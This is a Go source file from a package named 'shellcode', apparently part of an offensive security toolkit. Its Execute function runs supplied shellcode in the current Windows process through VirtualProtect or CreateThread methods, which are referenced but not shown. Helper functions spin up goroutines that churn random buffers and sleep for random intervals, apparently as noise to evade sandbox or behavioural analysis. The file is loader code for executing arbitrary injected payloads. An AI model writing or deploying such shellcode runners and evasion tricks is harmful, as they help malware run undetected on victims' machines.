package shellcode

import (
	"bytes"
	"runtime"
	"time"

	"github.com/pkg/errors"

	"project/internal/random"
)

func doUseless(c chan []byte) {
	buf := bytes.Buffer{}
	rand := random.New(0)
	n := 100 + rand.Int(100)
	for i := 0; i < n; i++ {
		buf.Write(random.Bytes(16 + rand.Int(1024)))
		c <- buf.Bytes()
	}
}

func schedule() {
	rand := random.New(0)
	bChan := make(chan []byte, 1024)
	n := 8 + rand.Int(8)
	for i := 0; i < n; i++ {
		go doUseless(bChan)
	}
	runtime.Gosched()
read:
	for {
		select {
		case b := <-bChan:
			b[0] = byte(rand.Int64())
		case <-time.After(25 * time.Millisecond):
			break read
		}
	}
	time.Sleep(time.Millisecond * time.Duration(50+rand.Int(100)))
}

// Execute is used to execute shellcode in current system
// in windows, default method is VirtualProtect
// warning: shellcode will be clean
func Execute(method string, shellcode []byte) error {
	switch runtime.GOOS {
	case "windows":
		switch method {
		case "", "vp":
			return VirtualProtect(shellcode)
		case "thread":
			return CreateThread(shellcode)
		default:
			return errors.Errorf("unknown method: %s", method)
		}
	case "linux":
		return errors.New("todo")
	default:
		return errors.New("execute unsupported current system")
	}
}
